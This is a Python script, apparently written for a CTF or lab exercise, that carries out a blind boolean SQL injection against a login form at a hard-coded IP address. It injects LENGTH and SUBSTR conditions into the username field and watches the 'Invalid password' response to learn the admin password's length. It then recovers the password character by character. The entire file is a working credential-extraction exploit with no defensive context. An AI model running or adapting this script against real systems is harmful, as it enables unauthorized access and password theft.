import requests

url = "http://195.134.67.7:10058/login"  


user = "admin"  


chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"

def find_password_length():
    for length in range(1, 35):  
        payload = f"{user}' AND LENGTH(password) = {length} --"
        print(payload)
        response = requests.post(url, data={'user': payload, 'password': ''})
        if "Invalid password" in response.text:
            return length
    return None

def brute_force_password(length):
    password = ""
    for i in range(1, length + 1):  # we check one character at a time
        for char in chars:  # bruteforce until we find the correct character
            payload = f"{user}' AND SUBSTR(password, {i}, 1) = '{char}' --"   # the SUBSRT extracts the i-th element of the actual password
            response = requests.post(url, data={'user': payload, 'password': ''})
            
            if "Invalid password" in response.text:  # that means tha the user input is correct, so the char is indeed in the i-th position of the password
                password += char
                print("Found character:", char)
                print("password so far:",password)
                break
    return password

password_length = find_password_length()
if password_length:
    print(f"Password length is: {password_length}")
    password = brute_force_password(password_length)
    print("The admin's password is:", password)
else:
    print("Failed to determine password length.")

